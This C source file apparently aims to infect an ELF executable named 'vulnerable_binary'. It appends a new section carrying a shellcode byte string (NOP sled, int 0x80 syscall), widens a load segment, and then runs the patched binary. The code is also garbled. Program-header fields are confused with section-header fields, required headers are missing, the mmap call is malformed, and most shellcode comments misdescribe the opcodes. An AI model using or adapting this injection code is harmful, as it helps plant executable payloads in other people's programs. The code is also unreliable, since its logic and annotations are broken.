#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>

void write_elf_section(Elf64_Ehdr *ehdr, Elf64_Shdr *shdr, const char *data, size_t len) {
    void *map_base;
    int ret;

    // Map the binary into memory
    map_base = mmap(NULL, ehdr->e_phnum * getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED, open("vulnerable_binary", O_RDWR), 0);
    if (map_base == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // Find the section header table
    Elf64_Phdr *phdr = (Elf64_Phdr *)((char*)map_base + ehdr->e_phoff);

    // Create an empty section right after the existing sections
    Elf64_Shdr sh = {
        .sh_name = 0,
        .sh_type = SHT_PROGBITS,
        .sh_flags = SHF_ALLOC | SHF_WRITE,
        .sh_addr = phdr[ehdr->e_phnum - 1].sh_addr + phdr[ehdr->e_phnum - 1].sh_size,
        .sh_offset = ehdr->e_shoff + sizeof(Elf64_Ehdr) + sizeof(Elf64_Shdr) * (ehdr->e_shnum - 1),
        .sh_size = len,
    };

    memcpy(&((Elf64_Shdr *)((char*)map_base + ehdr->e_shoff))[ehdr->e_shnum], &sh, sizeof(Elf64_Shdr));
    ehdr->e_shnum++;

    // Write the data to the new section
    memcpy((char*)map_base + sh.sh_offset, data, len);

    // Update the program header table
    for (int i = 0; i < ehdr->e_phnum; ++i) {
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_memsz < phdr[i].p_filesz + len) {
            phdr[i].p_memsz = phdr[i].p_filesz + len;
        }
    }

    // Write the updated binary back to disk
    ret = msync(map_base, ehdr->e_phnum * getpagesize(), MS_SYNC);
    if (ret != 0) {
        perror("msync");
        exit(EXIT_FAILURE);
    }

    // Unmap the binary from memory
    ret = munmap(map_base, ehdr->e_phnum * getpagesize());
    if (ret != 0) {
        perror("munmap");
        exit(EXIT_FAILURE);
    }
}

int main() {
    FILE *file = fopen("vulnerable_binary", "r+");
    if (!file) {
        perror("fopen");
        return EXIT_FAILURE;
    }

    Elf64_Ehdr ehdr;
    fseek(file, 0, SEEK_SET);
    fread(&ehdr, sizeof(Elf64_Ehdr), 1, file);

    Elf64_Shdr *shdr = malloc(sizeof(Elf64_Shdr) * ehdr.e_shnum);
    fseek(file, ehdr.e_shoff, SEEK_SET);
    fread(shdr, sizeof(Elf64_Shdr), ehdr.e_shnum, file);

    char buf[] = "\x90" // NOP sled
                  "\x31\xc0" // xor %eax, %eax
                  "\x50" // push %eax
                  "\x68" // push %esp
                  "\x68" // push %esp
                  "\x6a" // push %cl
                  "\x58" // pop %eax
                  "\xcd\x80" // int $0x80
                  "";

    write_elf_section(&ehdr, shdr, buf, strlen(buf));

    free(shdr);
    fclose(file);

    execl("./vulnerable_binary", "vulnerable_binary", NULL);
    perror("execl");
    return EXIT_FAILURE;
}
```

